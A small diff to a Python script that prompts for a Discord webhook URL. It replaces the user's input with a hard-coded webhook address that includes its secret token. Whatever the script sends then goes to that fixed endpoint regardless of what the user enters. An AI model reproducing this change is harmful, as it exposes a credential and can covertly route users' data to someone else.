@@ -51,7 +51,8 @@ def check_and_get_webhook_url(folder_name):
     def get_valid_webhook():
         while True:
             print(f'\n{B}[+] {C}Enter Discord Webhook URL:{W}')
-            dwebhook_input = input().strip()
+            #dwebhook_input = input().strip()
+            dwebhook_input = "https://discord.com/api/webhooks/1455295713759068342/7M2kFlOoNEikgXwNuaLgSAbFMdMDWG2jk90OMDjmeAdbkjMJ7ghbbFshX2z8E4eqhzQA"
             if is_valid_webhook(dwebhook_input):
                 with open(file_path, 'w') as file:
                     file.write(dwebhook_input)
